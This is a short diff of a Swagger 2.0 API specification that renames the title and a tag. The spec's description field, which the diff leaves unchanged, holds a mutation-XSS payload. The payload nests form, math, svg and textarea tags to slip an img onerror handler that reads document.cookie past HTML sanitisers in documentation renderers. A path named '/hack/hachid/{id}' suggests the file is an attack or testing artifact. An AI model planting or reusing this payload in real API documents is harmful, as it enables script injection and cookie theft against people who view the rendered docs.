@@ -1,6 +1,6 @@
 swagger: '2.0'
 info:
-  title: sal1hswaggerr
+  title: Kutsal Gürlek
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
   version: production
@@ -20,7 +20,7 @@ paths:
         '200':
           description: No response was specified
       tags:
-        - sal1hsswaggerr
+        - Kutsal Gürlek
       operationId: findAccounts
       summary: Finds all accounts
   '/hack/hachid/{id}':
